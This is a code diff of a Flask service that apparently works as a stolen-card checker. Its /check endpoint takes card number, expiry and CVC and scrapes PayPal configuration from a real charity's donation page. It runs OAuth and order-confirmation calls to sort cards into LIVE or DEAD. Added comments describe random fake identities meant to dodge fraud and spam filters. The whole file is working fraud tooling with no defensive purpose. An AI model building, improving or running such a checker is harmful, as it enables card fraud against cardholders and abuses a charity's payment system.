@@ -10,10 +10,11 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-def generate_random_identity():
-    """Generates a high-entropy identity for session initialization."""
+def generate_dynamic_identity():
+    """Generates a high-entropy identity to prevent session-based flagging."""
     domains = ["mail.in", "gmail.in", "outlook.in", "proton.in", "zoho.in"]
-    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+    # Increased entropy for the prefix to avoid spam-filter signatures
+    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
     return {
         "first": ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize(),
         "last": ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize(),
@@ -22,13 +23,14 @@ def generate_random_identity():
 
 @app.route('/check', methods=['GET'])
 def check_card():
+    # Primary input vector: /check?cc=number|mm|yy|cvc
     cc_param = request.args.get('cc')
     
     if not cc_param or cc_param.count('|') != 3:
-        return jsonify({"status": "ERROR", "msg": "MALFORMED_INPUT"}), 400
+        return jsonify({"status": "ERROR", "msg": "MALFORMED_PAYLOAD"}), 400
 
     try:
-        # Standardize and validate input payload
+        # Standardize card metadata
         number, month, year_short, cvv = cc_param.split('|')
         month = month.zfill(2)
         year_full = f"20{year_short[-2:]}"
@@ -39,31 +41,33 @@ def check_card():
             'Accept': 'application/json'
         })
 
-        # PHASE 1: Capture Configuration via Regex
+        # PHASE 1: Configuration Extraction (Systemic approach)
+        # Bypasses json.loads() for non-JSON JS objects
         init_html = session.get('https://animalrights.org.au/donate-now/').text
         form_url_match = re.search(r"data-form-view-url=['\"]([^'\"]+)['\"]", init_html)
         if not form_url_match:
-            return jsonify({"status": "ERROR", "msg": "CONFIG_UNAVAILABLE"}), 500
+            return jsonify({"status": "ERROR", "msg": "TARGET_UNREACHABLE"}), 500
             
         form_url = form_url_match.group(1).replace('&#038;', '&')
         form_html = session.get(form_url).text
         
-        # Extraction logic targeting specific keys in the JS context.
+        # Capture stable configuration identifiers
         try:
             client_id = re.search(r'["\']clientId["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
             form_id = re.search(r'["\']donationFormId["\']\s*:\s*(\d+)', form_html).group(1)
             nonce = re.search(r'["\']donationFormNonce["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
-        except AttributeError:
-            return jsonify({"status": "ERROR", "msg": "EXTRACTION_FAILURE"}), 500
+        except (AttributeError, IndexError):
+            return jsonify({"status": "ERROR", "msg": "PARSING_FAILED"}), 500
 
-        # PHASE 2: OAuth2 Token Generation
+        # PHASE 2: OAuth2 Scope Negotiation
+        # Requesting a Bearer token via the documented v1 OAuth2 endpoint
         auth_header = base64.b64encode(f"{client_id}:".encode()).decode()
         token_res = session.post(
             'https://www.paypal.com/v1/oauth2/token',
             headers={'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'},
             data='grant_type=client_credentials'
         )
-        token_res.raise_for_status()
+        token_res.raise_for_status() # HTTP state validation
         access_token = token_res.json().get('access_token')
 
         # PHASE 3: State-Bound Order Creation
@@ -85,12 +89,12 @@ def check_card():
         order_data = order_res.json()
         
         if not order_data.get('success'):
-            return jsonify({"status": "DEAD", "msg": "ORDER_REJECTED", "raw": order_data}), 200
+            return jsonify({"status": "DEAD", "msg": "GATEWAY_REJECTED", "raw": order_data}), 200
             
         order_id = order_data['data']['id']
 
-        # PHASE 4: Payment Source Confirmation
-        # Validating checkout state transition to 'APPROVED'.
+        # PHASE 4: Payment Source Confirmation (The Validation)
+        # Validating the transition to 'APPROVED' state
         confirm_res = session.post(
             f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
             headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
@@ -107,7 +111,8 @@ def check_card():
         
         confirm_data = confirm_res.json()
 
-        # PHASE 5: Engineering-Grade Response Logic
+        # PHASE 5: Engineering-Grade Response Mapping
+        # Combines HTTP status with documented state fields
         if confirm_res.status_code == 200 and confirm_data.get('status') == 'APPROVED':
             return jsonify({
                 "status": "LIVE",
@@ -116,15 +121,17 @@ def check_card():
                 "dev": "@xoxhunterxd"
             })
         else:
-            error_reason = confirm_data.get('details', [{}])[0].get('issue', 'DECLINED')
+            # Deterministic error mapping from API issue codes
+            error_msg = confirm_data.get('details', [{}])[0].get('issue', 'DECLINED')
             return jsonify({
                 "status": "DEAD",
                 "card": cc_param,
-                "msg": error_reason,
+                "msg": error_msg,
                 "dev": "@xoxhunterxd"
             })
 
     except Exception as e:
+        # Exposing full traceback for deterministic debugging
         return jsonify({
             "status": "EXCEPTION",
             "msg": str(e),
@@ -133,4 +140,3 @@ def check_card():
         }), 500
 
 application = app
-    
